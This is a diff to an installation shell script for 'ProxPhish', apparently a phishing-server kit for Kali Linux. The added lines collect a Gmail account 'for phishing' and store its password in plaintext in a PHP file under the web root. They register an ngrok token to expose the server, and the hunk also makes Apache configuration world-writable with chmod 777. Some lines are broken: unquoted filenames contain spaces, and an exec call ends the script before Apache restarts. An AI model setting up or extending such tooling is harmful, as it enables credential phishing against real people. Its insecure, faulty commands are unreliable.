@@ -17,9 +17,73 @@ rm -r /var/www/proxphish/apache2
 chmod -R 777 /etc/apache2/sites-available
 chmod -R 777 /etc/apache2/sites-available/000-default.conf
 cd /var/www/proxphish/__ROOT__
-chmod -R 777 /var/www/proxphish/__ROOT__/proxphish.desktop
-mv proxphish.desktop /usr/share/applications
+chmod -R 777 /var/www/proxphish/__ROOT__/proxphish web.desktop
+mv proxphish web.desktop /usr/share/applications
+chmod -R 777 /var/www/proxphish/__ROOT__/proxphish dns.desktop
+mv proxphish dns.desktop /usr/share/applications
+chmod -R 777 /var/www/proxphish/__ROOT__/proxphish panel.desktop
+mv proxphish panel.desktop /usr/share/applications
+
+unset your_mail
+unset your_pass
+
+echo "Give your gmail account details: This is your phishing server"
+
+echo "Give your gmail username"
+read your_mail
+
+echo "Give your gmail upassword"
+
+stty -echo
+ 
+#read password
+charcount=0
+while IFS= read -p "$prompt" -r -s -n 1 ch
+do
+    # Enter - accept password
+    if [[ $ch == $'\0' ]] ; then
+        break
+    fi
+    # Backspace
+    if [[ $ch == $'\177' ]] ; then
+        if [ $charcount -gt 0 ] ; then
+            charcount=$((charcount-1))
+            prompt=$'\b \b'
+            your_pass="${your_pass%?}"
+        else
+            PROMPT=''
+        fi
+    else
+        charcount=$((charcount+1))
+        prompt='*'
+        your_pass+="$ch"
+    fi
+done
+ 
+stty echo
+
+echo "" 
+echo "Gmail Account is set"
+
+
+email=$your_mail
+pass=$your_pass
+
+cat <<EOF > /var/www/proxphish/settings.php
+#setting email account for phishing
+$email
+$pass
+EOF
+
+
+echo "Give your ngrok authtoken" 
+read ngrok_token
+cd /var/www/proxphish/ngrok/
+exec ./ngrok authtoken $ngrok_token
+
+
 a2ensite 000-default.conf
 /etc/init.d/apache2 restart
+
 tput setaf 2; echo "ProxPhish successfully installed"
 echo "Find it in Kali Menu -> Exploitation Tools"
